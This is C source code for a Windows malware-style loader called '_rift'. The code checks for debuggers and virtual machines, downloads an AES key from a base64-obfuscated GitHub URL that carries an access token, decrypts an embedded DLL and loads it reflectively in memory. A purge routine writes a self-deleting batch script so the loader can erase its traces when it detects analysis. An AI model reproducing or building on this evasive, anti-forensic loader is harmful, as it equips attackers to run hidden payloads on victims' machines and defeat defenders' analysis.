#include "pch.h"
#include "_rift.h"

PVOID fnDownloadKey();

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information block
		HANDLE hPH = GetProcessHeap();
		g_PIB = (PPIB)HeapAlloc(hPH, 0, sizeof(PIB));
		g_PIB->hPH = hPH;
		g_PIB->hMH = hInstance;
		GetModuleFileNameW(hInstance, g_PIB->szMFN, MAX_PATH);
		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
	}

#ifndef _DEBUG
	// Protect Process
	BOOL bRE = fnAntiRE();
#endif
	fnInitializeXSR();

	{	// Test base64
		PVOID string = AllocMemory(259, 0);
		for (int i = 0; i < 259; i++)
			((PBYTE)string)[i] = (BYTE)(fnNext128p() >> 24);
		CopyMemory(string, "https://raw.githubusercontent.com/Lima-X-Coding/Win32._rift/master/_rift/main.c?token=AISLTIFBLEXNHDBHX6Z2FOS63QJ3U", 116);
		fnMd5HashingBegin();
		PVOID hash = fnMD5HashData(string, 4);

		SIZE_T bout;
		PVOID base = fnB64Encode(string, 116, &bout);
		FreeMemory(string);
		PVOID base2 = fnB64Decode(base, bout, &bout);
		FreeMemory(base);

		PVOID hash2 = fnMD5HashData(base2, 4);
		FreeMemory(base2);
		BOOL test = fnMD5Compare(hash, hash2);

		FreeMemory(hash);
		FreeMemory(hash2);
	}

	PVOID pKey = fnDownloadKey();
	if (!pKey) {
		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH, 0);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"..\\RIFTKEY");
		DWORD nKeyBlob;
		pKey = fnAllocReadFileW(szKeyBlob, &nKeyBlob);
	}
	fnAesCryptBegin();
	fnAesLoadKey(pKey);

	// init con
	fnOpenConsole();

	BOOL bVM = fnCheckVMPresent();

	SIZE_T nDll;
	PVOID pDll = fnUnpackResource(IDR_RIFTDLL, &nDll);
	fnAesCryptEnd();
	fnMd5HashingEnd();
	if (!pDll)
		return 0x1;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
	int a = fnDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
	int a = fnDllInit(10);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	FreeMemory(pDll);

	{	// CleanUp
		HANDLE hPH = GetProcessHeap();
		HeapFree(hPH, 0, g_PIB);

	} return 0;
}

// Only Test rn but might be implemented further
PVOID fnDownloadKey() {
	PCWSTR szAgent = fnAllocRandomB64W(8, 16);
	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hNet)
		return 0;
	FreeMemory(szAgent);

	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
	SIZE_T nURL;
	PCSTR szURL = fnB64Decode(szB64URL, 156, &nURL);
	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
	if (!hUrl)
		return 0;
	FreeMemory(szURL);

	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE, 0);

	SIZE_T nRead;
	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);

	return pBuffer;
}



/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered ( / called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
static CONST WCHAR t_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID fnPurge() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)AllocMemory(MAX_PATH * sizeof(WCHAR), 0);
	SIZE_T nRandom;
	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	PVOID pScriptW = AllocMemory(0x800, 0);
	UINT uiRandomID = fnNext128ss();
	PCWSTR szMFN = fnGetFileNameFromPathW(g_PIB->szMFN);
	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = (PSTR)HeapAlloc(g_PIB->hPH, 0, 0x400);
	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
	FreeMemory(pScriptW);

	// Write to Disk
	fnWriteFileCW(szFilePath, pScriptA, nScript);
	FreeMemory(pScriptA);
}